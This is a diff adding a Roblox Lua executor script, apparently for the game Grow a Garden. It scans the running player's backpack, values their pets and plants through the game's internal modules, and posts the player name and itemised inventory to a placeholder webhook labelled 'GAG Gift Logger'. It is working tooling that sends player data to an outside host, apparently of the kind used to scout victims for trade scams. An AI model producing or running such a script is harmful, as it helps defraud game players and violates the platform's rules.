@@ -1,0 +1,136 @@
+repeat wait() until game:IsLoaded()
+print("[DEBUG] Script started")
+
+-- Force reset for testing
+_G.scriptExecuted = false
+
+-- Optional: Re-enable this if needed later
+-- if game.PlaceId ~= 126884695634066 then
+--     print("[DEBUG] Wrong PlaceId:", game.PlaceId)
+--     return
+-- end
+
+-- Services
+local Players = game:GetService("Players")
+local HttpService = game:GetService("HttpService")
+local plr = Players.LocalPlayer
+local backpack = plr:WaitForChild("Backpack")
+local replicatedStorage = game:GetService("ReplicatedStorage")
+local modules = replicatedStorage:WaitForChild("Modules")
+
+-- Load modules safely
+local success, err = pcall(function()
+    calcPlantValue = require(modules:WaitForChild("CalculatePlantValue"))
+    petUtils = require(modules:WaitForChild("PetServices"):WaitForChild("PetUtilities"))
+    petRegistry = require(replicatedStorage:WaitForChild("Data"):WaitForChild("PetRegistry"))
+    numberUtil = require(modules:WaitForChild("NumberUtil"))
+    dataService = require(modules:WaitForChild("DataService"))
+end)
+
+if not success then
+    warn("[ERROR] Module load failed:", err)
+    return
+end
+
+print("[DEBUG] Modules loaded")
+
+-- Webhook
+local webhook = "YOUR_WEBHOOK_HERE"
+local request = (http and http.request) or (syn and syn.request) or (fluxus and fluxus.request) or request
+if not request then
+    warn("[ERROR] No HTTP request function available!")
+end
+
+-- Helpers
+local function formatNumber(n)
+    local suffixes = {"", "k", "m", "b", "t"}
+    local i = 1
+    while n >= 1000 and i < #suffixes do
+        n = n / 1000
+        i = i + 1
+    end
+    return (i == 1 and math.floor(n)) or string.format("%.2f%s", n, suffixes[i])
+end
+
+-- Item scanner
+local itemsToSend = {}
+local totalValue = 0
+local function getWeight(tool)
+    local match = tool.Name:match("%((%d+%.?%d*) ?kg%)")
+    return match and tonumber(match) or 0
+end
+
+print("[DEBUG] Scanning backpack items")
+
+for _, tool in ipairs(backpack:GetChildren()) do
+    if tool:IsA("Tool") then
+        local value, name, weight = 0, "", getWeight(tool)
+        if tool:GetAttribute("ItemType") == "Pet" then
+            local uuid = tool:GetAttribute("PET_UUID")
+            local petData = dataService:GetData().PetsData.PetInventory.Data[uuid]
+            if petData then
+                local petName = petData.PetType
+                name = petName
+                value = petRegistry.PetList[petName] and petRegistry.PetList[petName].SellPrice or 0
+            end
+        else
+            value = calcPlantValue(tool)
+            name = tool:GetAttribute("ItemName") or tool.Name
+        end
+
+        if value > 0 then
+            totalValue += value
+            table.insert(itemsToSend, {
+                Name = name,
+                Value = value,
+                Weight = weight
+            })
+            print(string.format("[DEBUG] Found: %s | Value: %s | Weight: %.2f", name, formatNumber(value), weight))
+        end
+    end
+end
+
+-- Send Webhook
+local function sendWebhook()
+    print("[DEBUG] Sending webhook...")
+
+    local fieldText = ""
+    for _, item in ipairs(itemsToSend) do
+        fieldText ..= string.format("%s (%.2fkg): ¢%s\n", item.Name, item.Weight, formatNumber(item.Value))
+    end
+
+    local payload = {
+        content = "Items scanned for gifting:",
+        embeds = {{
+            title = "🎁 Gifting Summary",
+            color = 65280,
+            fields = {
+                { name = "Player", value = plr.Name, inline = true },
+                { name = "Total Value", value = "¢" .. formatNumber(totalValue), inline = true },
+                { name = "Items", value = fieldText:sub(1, 1024), inline = false }
+            },
+            footer = { text = "GAG Gift Logger" }
+        }}
+    }
+
+    local success, err = pcall(function()
+        request({
+            Url = webhook,
+            Method = "POST",
+            Headers = {["Content-Type"] = "application/json"},
+            Body = HttpService:JSONEncode(payload)
+        })
+    end)
+
+    if success then
+        print("[DEBUG] Webhook sent successfully")
+    else
+        warn("[ERROR] Failed to send webhook:", err)
+    end
+end
+
+if #itemsToSend > 0 then
+    sendWebhook()
+else
+    print("[DEBUG] No items found above threshold.")
+end
